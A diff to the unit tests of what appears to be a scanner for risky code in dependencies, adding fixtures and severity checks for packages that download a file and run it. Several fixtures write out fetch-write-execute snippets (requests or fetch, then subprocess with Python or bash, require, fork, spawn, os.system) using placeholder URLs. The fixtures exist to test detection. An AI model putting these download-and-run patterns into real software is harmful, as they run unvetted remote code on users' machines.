@@ -171,17 +171,25 @@ DYNIMPORT = [
 
 # a received value written to a file that is then run (MAJOR only: import-time,
 # never an install-script escalation)
+# (label, text, line, the shell or interpreter that runs the file — None
+# for a file run on its own or require()d, the prebuilt-binary shape)
 DOWNLOAD_RUN = [
     ("write then run with the interpreter", "import requests, subprocess, sys\ndata = requests.get(" + U
-     + ").content\nopen('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n", 4),
+     + ").content\nopen('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n", 4, "Python"),
     ("writeFileSync then require", "const body = await (await fetch(" + U + ")).text();\n"
-     "fs.writeFileSync('m.js', body);\nrequire('./m.js');\n", 3),
+     "fs.writeFileSync('m.js', body);\nrequire('./m.js');\n", 3, None),
     ("urlretrieve then run", "import urllib.request, subprocess\n"
-     "urllib.request.urlretrieve('http://files.invalid/t', 'tool.py')\nsubprocess.run(['python', 'tool.py'])\n", 3),
+     "urllib.request.urlretrieve('http://files.invalid/t', 'tool.py')\nsubprocess.run(['python', 'tool.py'])\n", 3,
+     "Python"),
     ("pipe to a write stream then fork", "const https = require('https');\n"
-     "https.get(" + U + ", (r) => r.pipe(fs.createWriteStream(dst)));\nfork(dst);\n", 3),
+     "https.get(" + U + ", (r) => r.pipe(fs.createWriteStream(dst)));\nfork(dst);\n", 3, "node"),
     ("os.system of the dropped path", "import os, requests\nd = requests.get(" + U + ").content\n"
-     "open('r.sh', 'wb').write(d)\nos.system('r.sh')\n", 4),
+     "open('r.sh', 'wb').write(d)\nos.system('r.sh')\n", 4, None),
+    ("a script run with bash (ptmpl)", "import os, subprocess, requests\nr = requests.get(" + U + ")\n"
+     "with open(p, 'wb') as f:\n    f.write(r.content)\nos.chmod(p, 0o755)\n"
+     "subprocess.run(['/bin/bash', p, '--restore'])\n", 6, "bash"),
+    ("a script spawned with node", "const r = await fetch(" + U + ");\nfs.writeFileSync(f, await r.text());\n"
+     "spawn('node', [f], { detached: true });\n", 3, "node"),
 ]
 
 # deserialization / dynamic import that is NOT of a received value, and
@@ -327,19 +335,21 @@ class ReceivedCodeTests(unittest.TestCase):
                 self.assertNotIn(self.IMPORT_REASON, core.import_time_risk(text)[0])
                 self.assertNotIn(self.IMPORT_REASON, core.install_script_risk(text))
 
-    def test_download_to_file_is_major_only(self):
-        for label, text, line in DOWNLOAD_RUN:
+    def test_download_to_file(self):
+        for label, text, line, interp in DOWNLOAD_RUN:
             with self.subTest(label):
                 # a MAJOR import-time signal, on its line — CRITICAL when the file
-                # is run with the Python interpreter: a script, not a prebuilt binary
+                # is run with a shell or an interpreter: a script, not a prebuilt
+                # binary (0.1.7 for Python, 0.1.8 for the others)
                 reasons, at = core.import_time_risk(text)
-                python = "sys.executable" in text or "'python'" in text
-                self.assertIn(self.PY_DROP_REASON if python else self.DROP_REASON, reasons)
-                self.assertEqual(core.import_time_severity(reasons), "CRITICAL" if python else "MAJOR")
+                strong = f"downloads a script and runs it with {interp}"
+                self.assertIn(strong if interp else self.DROP_REASON, reasons)
+                self.assertEqual(core.import_time_severity(reasons), "CRITICAL" if interp else "MAJOR")
                 self.assertEqual(at, line)
-                # and never an install-script escalation, nor a received-code "run"
+                # an install-script reason only then (a binary's installer does the rest),
+                # and never a received-code "run"
                 self.assertNotIn(self.DROP_REASON, core.install_script_risk(text))
-                self.assertEqual(core.install_script_risk(text), [])
+                self.assertEqual(core.install_script_risk(text), [strong] if interp else [])
         for label, text in NOT_DOWNLOAD_RUN:
             with self.subTest(label):
                 self.assertNotIn(self.DROP_REASON, core.import_time_risk(text)[0])
@@ -424,6 +434,21 @@ class SubstitutedDownloadTests(unittest.TestCase):
 SP = "venv/lib/python3.12/site-packages/"
 
 
+def _tainted_exports(text):
+    """(names, {class: methods}) of a one-module package that hold or return
+    a received value, as the follower reads them (core._XfPackage)."""
+    mod = core._XfModule("m", "py", SP + "m.py", text)
+    core._xf_py_parse(mod, [])
+    held = core._XfPackage({"m": mod}).tainted()
+    names = frozenset(n for _k, n in held if "." not in n and not n.startswith("<"))
+    classes = {}
+    for _k, n in held:
+        if "." in n and not n.startswith("<"):
+            cls, meth = n.split(".", 1)
+            classes.setdefault(cls, set()).add(meth)
+    return names, {c: frozenset(m) for c, m in classes.items()}
+
+
 def _pkgfiles(mapping):
     """{package-relative path: content} -> dependency file dicts under a
     site-packages prefix (what dependency_checks / the follower see)."""
@@ -437,22 +462,22 @@ class CrossFileReceivedTests(unittest.TestCase):
 
     def test_tainted_exports_are_found(self):
         # a function that returns a received value (direct, and via a local)
-        self.assertEqual(core._xf_tainted_exports(
+        self.assertEqual(_tainted_exports(
             "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"), (frozenset({"pull"}), {}))
-        self.assertEqual(core._xf_tainted_exports(
+        self.assertEqual(_tainted_exports(
             "import requests\ndef pull():\n    r = requests.get(" + U + ")\n    return r.text\n"),
             (frozenset({"pull"}), {}))
         # a module-level name that holds a received value
-        self.assertEqual(core._xf_tainted_exports(
+        self.assertEqual(_tainted_exports(
             "import urllib.request\nPAYLOAD = urllib.request.urlopen(" + U + ").read().decode()\n"),
             (frozenset({"PAYLOAD"}), {}))
         # a class method that returns a received value
-        self.assertEqual(core._xf_tainted_exports(
+        self.assertEqual(_tainted_exports(
             "import requests\nclass Client:\n    def pull(self):\n        return requests.get(" + U + ").text\n"),
             (frozenset(), {"Client": frozenset({"pull"})}))
         # nothing received: no export (and the network-needle gate returns early)
-        self.assertEqual(core._xf_tainted_exports("def greeting():\n    return 'hello'\n"), (frozenset(), {}))
-        self.assertEqual(core._xf_tainted_exports(
+        self.assertEqual(_tainted_exports("def greeting():\n    return 'hello'\n"), (frozenset(), {}))
+        self.assertEqual(_tainted_exports(
             "import requests\ndef ping():\n    requests.get(" + U + ")\n    return 'ok'\n"), (frozenset(), {}))
 
     def test_a_docstring_example_is_not_an_export(self):
@@ -460,11 +485,11 @@ class CrossFileReceivedTests(unittest.TestCase):
         # export (real network libraries carry requests.get(...) in their docs)
         doc = ('import requests\n"""\nExample:\n    def fetch():\n        return requests.get(url).text\n"""\n'
                "SAFE = 1\n")
-        self.assertEqual(core._xf_tainted_exports(doc), (frozenset(), {}))
+        self.assertEqual(_tainted_exports(doc), (frozenset(), {}))
         commented = "import requests\ndef pull():\n    # return requests.get(u).text\n    return None\n"
-        self.assertEqual(core._xf_tainted_exports(commented), (frozenset(), {}))
+        self.assertEqual(_tainted_exports(commented), (frozenset(), {}))
         stringed = "import requests\nMSG = 'see requests.get(u) in the docs'\n"
-        self.assertEqual(core._xf_tainted_exports(stringed), (frozenset(), {}))
+        self.assertEqual(_tainted_exports(stringed), (frozenset(), {}))
 
     def test_class_method_across_files(self):
         got = self._one(_pkgfiles({
